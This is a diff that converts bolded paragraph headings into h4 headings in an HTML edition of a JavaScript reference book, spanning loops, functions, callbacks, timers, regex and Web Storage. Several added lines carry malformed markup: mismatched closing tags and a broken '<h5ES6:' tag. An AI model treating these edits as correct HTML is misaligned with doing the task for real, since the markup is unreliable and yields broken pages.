 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch18-4">Section 18.4: &quot;while&quot; Loops</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Standard While Loop</b></p>
+<h4>Standard While Loop</h4>
 <p>A standard while loop will execute until the condition given is false:</p>
 <pre>
 <b>var</b> i = 0;
@@ -9603,7 +9603,7 @@ while (i &lt; 100) {
 &hellip;<br/>
 99
 </blockquote>
-<p><b>Decremented loop</b></p>
+<h4>Decremented loop</h4>
 <pre>
 <b>var</b> i = 100;
 while (i &gt; 0) {
@@ -9620,7 +9620,7 @@ while (i &gt; 0) {
 &hellip;<br/>
 1
 </blockquote>
-<p><b>Do&hellip;while Loop</b></p>
+<h4>Do&hellip;while Loop</h4>
 <p>A do&hellip;while loop will always execute at least once, regardless of
 whether the condition is true or false:</p>
 <pre>
@@ -9636,7 +9636,7 @@ whether the condition is true or false:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch18-5">Section 18.5: &quot;continue&quot; a loop</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Continuing a &quot;for&quot; Loop</b></p>
+<h4>Continuing a &quot;for&quot; Loop</h4>
 <p>When you put the <b>continue</b> keyword in a for loop, execution jumps
 to the update expression (i in the example):</p>
 <pre>
@@ -9652,7 +9652,7 @@ to the update expression (i in the example):</p>
 0<br/>
 2
 </blockquote>
-<p><b>Continuing a While Loop</b></p>
+<h4>Continuing a While Loop</h4>
 <p>When you <b>continue</b> in a while loop, execution jumps to the condition (i &lt; 3 
 in the example):</p>
 <pre>
@@ -9976,7 +9976,7 @@ Uncaught ReferenceError: sum is not defined
   <li>Depending on ECMAScript version, named and anonymous functions may treat the function 
     name property differently</li>
 </ul>
-<p><b>Named functions are hoisted</b></p>
+<h4>Named functions are hoisted</h4>
 <!-- page 167 -->
 <p>When using an anonymous function, the function can only be called
 after the line of declaration, whereas a named function can be called
@@ -9999,7 +9999,7 @@ console.log(&apos;bar&apos;);
 <blockquote>
 bar
 </blockquote>
-<p><b>Named Functions in a recursive scenario</b></p>
+<h4>Named Functions in a recursive scenario</h4>
 <p>A recursive function can be defined as:</p>
 <pre>
 <b>var</b> say = <b>function</b> (times) {
@@ -10074,7 +10074,7 @@ sayHelloTimes(2);
 Hello!
 Hello!
 </blockquote>
-<p><b>The name property of functions</b></p>
+<h4>The name property of functions</h4>
 <p>Before ES6, named functions had their name properties set to their
 function names, and anonymous functions had their name properties set
 to the empty string.</p>
@@ -10150,7 +10150,7 @@ window.x = 12;
 console.log(example());  // <i>Uncaught TypeError: Cannot read property &apos;x&apos; of undefined(</i>...)
 </pre>
 <h5>Version ≥ 7</h5>
-<p><b>Bind Operator</b></p>
+<h4>Bind Operator</h4>
 <p>The double colon <b>bind operator</b> can be used as a shortened syntax for the concept explained above:</p>
 <pre>
 <b>var</b> log = console.log.bind(console);  // <i>long version</i>
@@ -10163,19 +10163,19 @@ foo.bar.apply(foo, args);  // <i>long version</i>
 foo::bar(&hellip;args);  // <i>short version</i>
 </pre>
 <p>This syntax allows you to write normally, without worrying about binding <b>this</b> everywhere.</p>
-<p><b>Binding console functions to variables var</b></p>
+<h4>Binding console functions to variables var</h4>
 <pre>
 var log = console.log.bind(console);
 </pre>
-<p><b>Usage:</b></p>
+<h4>Usage:</h4>
 <pre>
 log(&apos;one&apos;, &apos;2&apos;, 3, &lbrack;4&rbrack;, {5: 5});
 </pre>
-<p><b>Output:</b></p>
+<h4>Output:</h4>
 <pre>
 one 2 3 &lbrack;4&rbrack; Object {5: 5}
 </pre>
-<p><b>Why would you do that?</b></p>
+<h4>Why would you do that?</h4>
 <p>One use case can be when you have custom logger and you want to decide on runtime which one to use.</p>
 <pre>
 <b>var</b> logger = require(&apos;appLogger&apos;);
@@ -10243,7 +10243,7 @@ logArguments(&apos;a&apos;, &hellip;generateNumbers(), &hellip;&apos;pqr&apos;, 
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch19-7">Section 19.7: Anonymous Function</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Defining an Anonymous Function</b></p>
+<h4>Defining an Anonymous Function</h4>
 <p>When a function is defined, you often give it a name and then invoke
 it using that name, like so:</p>
 <pre>
@@ -10269,7 +10269,7 @@ automatically create a reference to it for you. At first glance, it
 may appear as if such a thing would have no use, but there are several
 scenarios where anonymous functions are very convenient.</p>
 
-<p><b>Assigning an Anonymous Function to a Variable</b></p>
+<h4>Assigning an Anonymous Function to a Variable</h4>
 <p>A very common use of anonymous functions is to assign them to a
 variable:</p>
 <pre>
@@ -10279,7 +10279,7 @@ foo();
 <p>This use of anonymous functions is covered in more detail in Functions
 as a variable</p>
 
-<p><b>Supplying an Anonymous Function as a Parameter to Another Function</b></p>
+<p><b>Supplying an Anonymous Function as a Parameter to Another Function</h4>
 <p>Some functions may accept a reference to a function as a parameter.
 These are sometimes referred to as &quot;dependency injections&quot; or 
 &quot;callbacks&quot;, because it allows the function your calling to 
@@ -10297,7 +10297,7 @@ in this one place and break the natural flow and reading of your code
 (a colleague would have to leave this code to find your function to
 understand what&apos;s going on).</p>
 
-<p><b>Returning an Anonymous Function From Another Function</b></p>
+<h4>Returning an Anonymous Function From Another Function</h4>
 <p>Sometimes it&apos;s useful to return a function as the result of another
 function. For example:</p>
 <!-- page 173 -->
@@ -10309,7 +10309,7 @@ function. For example:</p>
   <b>else if</b> ( algorithm === &apos;md5&apos; ) <b>return function</b>( value ){ /&ast;&hellip;&ast;/ };
 }
 </pre>
-<p><b>Immediately Invoking an Anonymous Function</b></p>
+<h4>Immediately Invoking an Anonymous Function</h4>
 <p>Unlike many other languages, scoping in JavaScript is function-level,
 not block-level. (See Function Scoping ). In some cases, however,
 it&apos;s necessary to create a new scope. For example, it&apos;s common to
@@ -10342,7 +10342,7 @@ initialize();
 }()) // &lt;&minus;&minus; the parentheses invokes the function immediately
 <b>&lt;/script&gt;</b>
 </pre>
-<p><b>Self-Referential Anonymous Functions</b></p>
+<h4>Self-Referential Anonymous Functions</h4>
 
 <p>Sometimes it&apos;s useful for an anonymous function to be able to refer
 to itself. For example, the function may need to recursively call
@@ -10449,7 +10449,7 @@ param_check(<b>undefined</b>);  // <i>-&amp;quot;str is of type: string&quot;</i
 param_check(1);  // <i>-&amp;quot;1 is of type: number&quot;</i>
 param_check(<b>this</b>);  // <i>-&amp;quot;&lbrack;object Window&rbrack; is of type: object&quot;</i>
 </pre>
-<p><b>Functions/variables as default values and reusing parameters</b></p>
+<h4>Functions/variables as default values and reusing parameters</h4>
 <p>The default parameters&apos; values are not restricted to numbers, strings
 or simple objects. A function can also be set as the default value callback = function(){}:</p>
 <h5>Version ≥ 6</h5>
@@ -10487,7 +10487,7 @@ add(2, 7);              // <i>18, 18</i>
 add(1, 2, 5);           // <i>8, 10</i>
 add(1, 2, 5, 10);       // <i>8, 20</i>
 </pre>
-<p><b>Reusing the function&apos;s return value in a new invocation&apos;s default value:</b></p>
+<h4>Reusing the function&apos;s return value in a new invocation&apos;s default value:</h4>
 <h5>Version ≥ 6</h5>
 <pre>
 <b>let</b> array = &lbrack;1&rbrack;;  // <i>meaningless: this will be overshadowed in the function&apos;s scope</i>
@@ -10499,7 +10499,7 @@ add(5);     // <i>&lbrack;5&rbrack;</i>
 add(6);     // <i>&lbrack;6&rbrack;, not &lbrack;5, 6&rbrack;</i>
 add(6, add(5));  // <i>&lbrack;5, 6&rbrack;</i>
 </pre>
-<p><b>arguments value and length when lacking parameters in invocation</b></p>
+<h4>arguments value and length when lacking parameters in invocation</h4>
 <p>The arguments array object only retains the parameters whose values
 are not default, i.e. those that are explicitly provided when the
 function is invoked:</p>
@@ -10677,7 +10677,7 @@ numeric values and returns their sum:</p>
 }
 console.log(addition(2, 3));  // <i>-&gt; 5</i>
 </pre>
-<p><b>arguments object</b><p>
+<h4>arguments object</b><p>
 
 <p>The arguments object contains all the function&apos;s parameters that
 contain a non-default value. It can also be used even if the
@@ -10689,7 +10689,7 @@ parameters are not explicitly declared:</p>
 <pre>
 (<b>function</b>() { console.log(<b>typeof</b>arguments) })();  // <i>-&bsol;object</i>
 </pre>
-<p><b>Rest parameters: function ( &hellip; parm) {}</b></p>
+<h4>Rest parameters: function ( &hellip; parm) {}</h4>
 <p>In ES6, the&hellip;syntax when used in the declaration of a function&apos;s
 parameters transforms the variable to its right into a single object
 containing all the remaining parameters provided after the declared
@@ -10700,7 +10700,7 @@ of arguments, which will become part of this variable:</p>
 // <i>&minus&gt; object: 123</i>
 </pre>
 
-<p><b>Spread parameters: function_name(&hellip;varb);</b></p>
+<h4>Spread parameters: function_name(&hellip;varb);</h4>
 
 <p>In ES6, the &hellip; syntax can also be used when invoking a function by
 placing an object/variable to its right. This allows that object&apos;s
@@ -10751,15 +10751,20 @@ rambda</a>/ etc.) but you can also start out with a simple implementation such a
 <h3 id="ch19-14">Section 19.14: Get the name of a function object</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h5>Version ≥ 6</h5>
-<p><b>ES6</b>:</h5>
+
+<h5ES6:</h5>
+
 <pre>
 myFunction.name
 </pre>
+
 <p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/name" 
 target="_blank" rel="noopener noreferrer">Explanation on MDN</a>.
 As of 2015 works in Node.js and all major browsers except IE.</p>
+
 <h5>Version ≥ 5</h5>
-<p><b>ES5</b>:</p>
+
+<h5>ES5</h5>
 
 <p>If you have a reference to the function, you can do:</p>
 <pre>
@@ -10827,7 +10832,7 @@ in which context the function will be used yet.</p>
 </pre>
 <p>Now to use this function, you need to put it in place of a variable
 somewhere else in your code:</p>
-<p><b>Using the function result as an argument for another function:</b></p>
+<h4>Using the function result as an argument for another function:</h4>
 <pre>
 console.log(firstChar(&quot;Hello world&quot;));
 </pre>
@@ -10835,7 +10840,7 @@ console.log(firstChar(&quot;Hello world&quot;));
 <pre>
 &gt; H
 </pre>
-<p><b>The return statement ends the function</b></p>
+<h4>The return statement ends the function</h4>
 <p>If we modify the function in the beginning, we can demonstrate that the return 
 statement ends the function.</p>
 <!-- page 182 -->
@@ -10856,7 +10861,7 @@ console.log(firstChar(&quot;JS&quot;));
 &gt; J
 </pre>
 <p>It will not print the message after the return statement, as the function has now been ended.</p>
-<p><b>Return statement spanning multiple lines:</b></p>
+<h4>Return statement spanning multiple lines:</h4>
 <p>In JavaScript, you can normally split up a line of code into many lines for readability 
 purposes or organization. This is valid JavaScript:</p>
 <pre>
@@ -10990,7 +10995,7 @@ invoke the returned function and pass its return value to hashedValue.</p>
 // <i>Example 6</i>
 <b>var</b> hashedValue = getHashingFunction( &apos;sha1&apos; )( &apos;Fred&apos; );
 </pre>
-<p><b>A Note on Hoisting</b></p>
+<h4>A Note on Hoisting</h4>
 <p>Keep in mind that, unlike normal function declarations, variables that
 reference functions are not &quot;hoisted&quot;. In example 2, the md5Hash and
 sha1Hash functions are defined at the bottom of the script, but are
@@ -11143,7 +11148,7 @@ its scope (immutability).</p>
 <blockquote>
 Pure functions must not change any variable outside their scope
 </blockquote>
-<p><b>Impure function</b></p>
+<h4>Impure function</h4>
 <pre>
 <b>let</b> obj = { a: 0 }
 <b>const</b> impure = (input) =&gt; {
@@ -11156,7 +11161,7 @@ console.log(obj)  // <i>Logs { &quot;a&quot;: 1 }</i>
 console.log(b)    // <i>Logs 1</i>
 </pre>
 <p>The function changed the obj.a value that is outside its scope.</p>
-<p><b>Pure function</b></p>
+<h4>Pure function</h4>
 <pre>
 <b>let</b> obj = { a: 0 }
 <b>const</b> pure = (input) =&gt; {
@@ -11172,7 +11177,7 @@ console.log(b) // <i>Logs 1</i>
 <blockquote>
 Pure functions must not rely on variables outside their scope
 </blockquote>
-<p><b>Impure function</b></p>
+<h4>Impure function</h4>
 <pre>
 <b>let</b> a = 1;
 <b>let</b> impure = (input) =&gt; {
@@ -11187,7 +11192,7 @@ console.log(impure(2))  // <i>Logs 4</i>
 <p>This <b>impure</b> function rely on variable a that is defined outside
 its scope. So, if a is modified, impure&apos;s function result will be
 different.</p>
-<p><b>Pure function</b></p>
+<h4>Pure function</h4>
 <pre>
 <b>let</b> pure = (input) =&gt; {
   <b>let</b> a = 1;
@@ -11544,7 +11549,7 @@ MazdaMPV&lbrack;METADATA&rbrack;();  // <i>{ make: &quot;Mazda&quot;, model: &qu
 approach to handle private states. There are 4 common solutions for
 handling private states:</p>
 
-<p><b>Using Symbols</b></p>
+<h4>Using Symbols</h4>
 
 <p>Symbols are new primitive type introduced on in ES2015, as defined at
 <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Symbol" 
@@ -11586,7 +11591,7 @@ the method to get the object symbols.</p>
 <b>const</b> secretKeys = Object.getOwnPropertySymbols(agent);
 agent&lbrack;secretKeys&lbrack;0&rbrack;&rbrack; // <i>&apos;steal all the ice cream&apos; , we got the secret.</i>
 </pre>
-<p><b>Using WeakMaps</b></p>
+<h4>Using WeakMaps</h4>
 
 <p>WeakMap is a new type of object that have been added for es6.</p>
 
@@ -11629,7 +11634,7 @@ export class SecretAgent {
 since we didn&apos;t bind it to our instance properties, this approach is
 totally private, and we can&apos;t reach the agent topSecret.</p>
 
-<p><b>Define all methods inside the constructor</b></p>
+<h4>Define all methods inside the constructor</h4>
 
 <p>The idea here is simply to define all our methods and members inside
 the constructor and use the closure to access private members without
@@ -11648,7 +11653,7 @@ export class SecretAgent {
 </pre>
 <p>In this example as well the data is 100% private and can&apos;t be reached
 outside the class, so our agent is safe.</p>
-<p><b>Using naming conventions</b></p>
+<h4>Using naming conventions</h4>
 <p>We will decide that any property who is private will be prefixed with &lowbar;.</p>
 <p>Note that for this approach the data isn&apos;t really private.</p>
 <pre>
@@ -11821,7 +11826,7 @@ check(15);  // <i>This value of &grave;this&grave; was explicitly bound, the fun
 <b>var</b> check8 = monitor.check.bind(monitor, 8);
 check8();  // <i>We also bound the argument to &grave;8&grave; here. It can&apos;t be re-specified.</i>
 </pre>
-<p><b>Hard binding</b></p>
+<h4>Hard binding</h4>
 <ul>
   <li>The object of <i>hard binding</i> is to &quot;hard&quot; link a reference to <b>this</b>.</li>
   <li>Advantage: It&apos;s useful when you want to protect particular objects from being lost.</li>
@@ -12233,7 +12238,7 @@ chaining. Chainable objects should be all or nothing (not a chainable
 object even if parts are). An object should not be called chainable if
 only some of its functions are.</p>
 
-<p><b>Object designed to be chainable</b></p>
+<h4>Object designed to be chainable</h4>
 <pre>
 <b>function</b> Vec(x = 0,y = 0) {
   <b>this</b>.x = x;
@@ -12261,7 +12266,7 @@ Vec.<b>prototype</b> = {
   }
 }
 </pre>
-<p><b>Chaining example</b></p>
+<h4>Chaining example</h4>
 <pre>
 <b>var</b> vec = <b>new</b> Vec();
 vec.add({x:10, y:10})
@@ -12274,7 +12279,7 @@ vec.add({x:10, y:10})
    .scale(2)           // <i>from which you can continue chaining</i>
    .log()
 </pre>
-<p><b>Don&apos;t create ambiguity in the return type</b></p>
+<p><b>Don&apos;t create ambiguity in the return type</h4>
 <p>Not all function calls return a useful chainable type, nor do they
 always return a reference to self. This is where common sense use of
 naming is important. In the above example the function call .() is
@@ -12291,7 +12296,7 @@ line.rotate(1)
 // <i>toVec is just as good as long as the programmer can use the naming</i>
 // <i>to infer the return type</i>
 </pre>
-<p><b>Syntax convention</b></p>
+<h4>Syntax convention</h4>
 <p>There is no formal usage syntax when chaining. The convention is to
 either chain the calls on a single line if short or to chain on the
 new line indented one tab from the referenced object with the dot on
@@ -12303,7 +12308,7 @@ clearly denoting the end of the chain.</p>
   title=" "
   alt="."
   style="border: 2px solid #000000; width:7.486in;" />
-<p><b>A bad syntax</b></p>
+<h4>A bad syntax</h4>
 <pre>
 vec            // <i>new line before the first function call</i>
 .scale()       // <i>can make it unclear what the intention is</i>
@@ -12313,7 +12318,7 @@ vec.           // <i>the dot on the end of the line</i>
    scale(1/2); // <i>and will likely frustrate as can easily be missed</i>
                // <i>when trying to locate bugs</i>
 </pre>
-<p><b>Left hand side of assignment</b></p>
+<h4>Left hand side of assignment</h4>
 <!-- page 212 -->
 <p>When you assign the results of a chain the last returning call or
 object reference is assigned.</p>
@@ -12326,7 +12331,7 @@ object reference is assigned.</p>
 <p>In the above example vec2 is assigned the value returned from the last
 call in the chain. In this case, that would be a copy of vec after the
 scale and add.</p>
-<p><b>Summary</b></p>
+<h4>Summary</h4>
 <p>The advantage of changing is clearer more maintainable code. Some
 people prefer it and will make chainable a requirement when selecting
 an API. There is also a performance benefit as it allows you to avoid
@@ -12425,7 +12430,7 @@ foo(array, <b>function</b>(x) {
   console.log(x);
 });
 </pre>
-<p><b>Examples with Asynchronous Functions</b></p>
+<p><b>Examples with Asynchronous Functions</h4>
 <p>In jQuery, the <b>&dollar;getJSON()</b> method to fetch JSON data is asynchronous.
 Therefore, passing code in a callback makes sure that the code is called </i>after</i> 
 the JSON is fetched.</p>
@@ -12572,7 +12577,7 @@ called even after the original function has returned.</p>
 }
 <b>var</b> s = <b>new</b> SomeClass(&quot;hello&quot;, someElement);
 </pre>
-<p><b>Solutions</b></p>
+<h4>Solutions</h4>
 <ul>
   <li>Use bind<br/>
   <b>bind</b> effectively generates a new function that sets <b>this</b> to
@@ -12600,7 +12605,7 @@ called even after the original function has returned.</p>
 </ul>
 <p>Often you&apos;d like to call a member function, ideally passing any
 arguments that were passed to the event on to the function.</p>
-<p><b>Solutions:</b></p>
+<h4>Solutions:</h4>
 <ul>
   <li>Use bind<br/>
   <pre>
@@ -12642,7 +12647,7 @@ arguments that were passed to the event on to the function.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch29-5">Section 29.5: Callback using Arrow function</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Using arrow function as callback function can reduce lines of code.</b></p>
+<h4>Using arrow function as callback function can reduce lines of code.</h4>
 <p>The default syntax for arrow function is</p>
 <pre>
 () =&gt; {}
@@ -12748,7 +12753,7 @@ window.setInterval(waitFunc, 5000);
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch30-3">Section 30.3: Intervals</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Standard</b></p>
+<h4>Standard</h4>
 <p>You don&apos;t need to create the variable, but it&apos;s a good practice as
 you can use that variable with clearInterval to stop the currently
 running interval.</p>
@@ -12759,7 +12764,7 @@ running interval.</p>
 <p>If you need to pass parameters to the doSomething function, you can
 pass them as additional parameters beyond the first two to
 setInterval.</p>
-<p><b>Without overlapping</b></p>
+<h4>Without overlapping</h4>
 <p>setInterval, as above, will run every 5 seconds (or whatever you set
 it to) no matter what. Even if the function doSomething takes long
 than 5 seconds to run. That can create issues. If you just want to
@@ -12808,7 +12813,7 @@ window.setTimeout(stopFunc, 3000);
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch30-6">Section 30.6: setTimeout, order of operations, clearTimeout</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>setTimeout</b></p>
+<h4>setTimeout</h4>
 <ul>
   <li>Executes a function, after waiting a specified number of milliseconds.</li>
   <li>Used to delay the execution of a function.</li>
@@ -12824,7 +12829,7 @@ setTimeout(<b>function</b>() {
   console.log(&apos;hello&apos;);
 }, 1000);
 </pre>
-<p><b>Problems with setTimeout</b></p>
+<h4>Problems with setTimeout</h4>
 <p>if you&apos;re using the setTimeout method in a for loop:</p>
 <!-- page 221 -->
 <pre>
@@ -12845,7 +12850,7 @@ setTimeout(<b>function</b>() {
 </pre>
 <p>It will output the value 0,1,2. Here, we're passing the i into the
 function as a parameter(j).</p>
-<p><b>Order of operations</b></p>
+<h4>Order of operations</h4>
 <p>Additionally though, due to the fact that JavaScript is single
 threaded and uses a global event loop, setTimeout can be used to add
 an item to the end of the execution queue by calling setTimeout with
@@ -12866,11 +12871,11 @@ setTimeout will execute immediately. It will take slightly more than
 that depending upon the items to be executed remaining in the
 execution queue. This one is just pushed to the end of the queue.</p>
 
-<p><b>Cancelling a timeout</b></p>
+<h4>Cancelling a timeout</h4>
 <p><b>clearTimeout():</b> stops the execution of the function specified in setTimeout()</p>
 <b>Syntax:</b> clearTimeout(timeoutVariable) or window.clearTimeout(timeoutVariable)</p>
 
-<p><b>Example:</b></p>
+<h4>Example:</h4>
 <pre>
 <b>var</b> timeout = setTimeout(<b>function</b>() {
   console.log(&apos;hello&apos;);
@@ -12916,7 +12921,7 @@ clearTimeout(timeout);  // <i>The timeout will no longer be executed</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch31-1">Section 31.1: Creating a RegExp Object</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Standard Creation</b></p>
+<h4>Standard Creation</h4>
 <p>It is recommended to use this form only when creating regex from
 dynamic variables.</p>
 <p>Use when the expression may change or the expression is user generated.</p>
@@ -12932,7 +12937,7 @@ with a string)</p>
 <pre>
 <b>var</b> re = <b>new</b> RegExp(&quot;<b>&bsol;&bsol;</b>w&ast;&quot;);
 </pre>
-<p><b>Static initialization</b></p>
+<h4>Static initialization</h4>
 <p>Use when you know the regular expression will not change, and you know
 what the expression is before runtime.</p>
 <pre>
@@ -12984,7 +12989,7 @@ or more lowercase letters. Since the pattern matches the string,
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch31-4">Section 31.4: Matching With .exec()</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Match Using .exec()</b></p>
+<h4>Match Using .exec()</h4>
 <p>RegExp.<b>prototype</b> . exec (string) returns an array of captures, or <b>null</b> if there was no match.
 </p>
 <pre>
@@ -12995,7 +13000,7 @@ or more lowercase letters. Since the pattern matches the string,
 <p>match&lbrack;0&rbrack; is the full match string.</p>
 <p>match&lbrack;1&rbrack; is the text corresponding to the first captured group.match&lbrack;n&rbrack; 
  would be the value of the <i>n</i>th captured group.</p>
-<p><b>Loop Through Matches Using .exec()</b></p>
+<h4>Loop Through Matches Using .exec()</h4>
 <pre>
 <b>var</b> re = <i>/a/g</i>;
 <b>var</b> result;
@@ -13020,7 +13025,7 @@ expressions as arguments.</p>
   <li>&quot;string&quot;.split(&hellip;</li>
   <li>&quot;string&quot;.search(&hellip;</li>
 </ul>
-<p><b>Match with RegExp</b></p>
+<h4>Match with RegExp</h4>
 console.log(&quot;string&quot;.match(<i>/&lbrack;i-n&rbrack;+/</i>));
 console.log(&quot;string&quot;.match(<i>/(r)&lbrack;i-n&rbrack;+/</i>));
 </pre>
@@ -13029,7 +13034,7 @@ console.log(&quot;string&quot;.match(<i>/(r)&lbrack;i-n&rbrack;+/</i>));
 Array &lbrack;&quot;in&quot;&rbrack;
 Array &lbrack;&quot;rin&quot;, &quot;r&quot;&rbrack;
 </blockquote>
-<p><b>Replace with RegExp</b></p>
+<h4>Replace with RegExp</h4>
 <pre>
 console.log(&quot;string&quot;.replace(<i>/&lbrack;i-n&rbrack;+/</i>,&quot;foo&quot;));
 </pre>
@@ -13037,7 +13042,7 @@ console.log(&quot;string&quot;.replace(<i>/&lbrack;i-n&rbrack;+/</i>,&quot;foo&q
 <blockquote>
 strfoog
 </blockquote>
-<p><b>Split with RegExp</b></p>
+<h4>Split with RegExp</h4>
 <pre>
 console.log(&quot;stringstring&quot;.split(<i>/&lbrack;i-n&rbrack;+/</i>));
 </pre>
@@ -13045,7 +13050,7 @@ console.log(&quot;stringstring&quot;.split(<i>/&lbrack;i-n&rbrack;+/</i>));
 <blockquote>
 Array &lbrack;&quot;str&quot;, &quot;gstr&quot;, &quot;g&quot;&rbrack;
 </blockquote>
-<p><b>Search with RegExp</b></p>
+<h4>Search with RegExp</h4>
 <p>search.() returns the index at which a match is found or -1.</p>
 <pre>
 console.log(&quot;string&quot;.search(<i>/&lbrack;i-n&rbrack;+/</i>));
@@ -13062,7 +13067,7 @@ console.log(&quot;string&quot;.search(<i>/&lbrack;o-q&rbrack;+/</i>));
 <p>JavaScript supports several types of group in its Regular Expressions,
 <i>capture groups</i>, <i>non-capture groups</i> and <i>lookaheads</i>. Currently,
 there is no <i>look-behind</i> support.</p>
-<p><b>Capture</b></p>
+<h4>Capture</h4>
 <p>Sometimes the desired match relies on its context. This means a simple
 <i>RegExp</i> will over-find the piece of the <i>String</i> that is of interest,
 so the solution is to write a capture group (pattern). The captured data can
@@ -13089,7 +13094,7 @@ str.replace(re, &apos;&dollar;1 &apos;);  // <i>&quot;aa b cc 1+2&quot;</i>
 // <i>Function replacement</i>
 str.replace(re, (m, &dollar;1) =&gt; &dollar;1 &plus; &apos; &apos;);  // <i>&quot;aa b cc 1+2&quot;</i>
 </pre>
-<p><b>Non-Capture</b></p>
+<h4>Non-Capture</h4>
 <p>Using the form (?:pattern), these work in a similar way to capture groups,
 except they do not store the contents of the group after the match.</p>
 <p>They can be particularly useful if other data is being captured which
@@ -13100,7 +13105,7 @@ pattern matching such as an OR</p>
   re = <i>/(?:&bsol;&bsol;b&vert;c)(&lbrack;a-z&rbrack;)&amp;plus;/g</i>;
 str.replace(re, &apos;&dollar;1 &apos;); // <i>&quot;aa+b c 1+2&quot;</i>
 </pre>
-<p><b>Look-Ahead</b></p>
+<h4>Look-Ahead</h4>
 <p>If the desired match relies on something which follows it, rather than
 matching that and capturing it, it is possible to use a look-ahead to
 test for it but not include it in the match. A positive look-ahead has
@@ -13254,7 +13259,7 @@ document.cookie = name &plus; &quot;=; expires=&quot; &plus; expiry.toGMTString(
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch33">Chapter 33: Web Storage</h2>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Parameter Description</b></p>
+<h4>Parameter Description</h4>
 <pre>
 <i>name</i> The key/name of the item 
 <i>value</i> The value of the item
@@ -13282,7 +13287,7 @@ localStorage.setItem(&apos;players&apos;, JSON.stringify(players));
 console.log(JSON.parse(localStorage.getItem(&apos;players&apos;)));
 // <i>&lbrack; Object { name: &quot;Tyler&quot;, score: 22 }, Object { name: &quot;Ryan&quot;, score: 41 } &rbrack;</i>
 </pre>
-<p><b>localStorage limits in browsers</b></p>
+<h4>localStorage limits in browsers</h4>
 <p>Mobile browsers:</p>
 <table border="1" style="width:200px">
   <thead>
@@ -13326,7 +13331,7 @@ localStorage.greet ;                   // <i>Same as: window.localStorage.getIte
 // <i>Clear storage</i>
 localStorage.clear();
 </pre>
-<p><b>Example:</b></p>
+<h4>Example:</h4>
 <pre>
 // <i>Store values (Strings, Numbers)</i>
 localStorage.hello = &quot;Hello&quot;;
@@ -13371,7 +13376,7 @@ window.addEventListener(&apos;storage&apos;, <b>function</b>(event) {
   }
 });
 </pre>
-<p><b>Notes</b><p>
+<h4>Notes</b><p>
 <!-- page 231 -->
 <p>Event is not fired or catchable under Chrome, Edge and Safari if
 domain was modified through script.</p>
@@ -13475,7 +13480,7 @@ setItem) use removeItem</p>
 <pre>
 localStorage.removeItem(&quot;greet&quot;);
 </pre>
-<p><b>Example:</b></p>
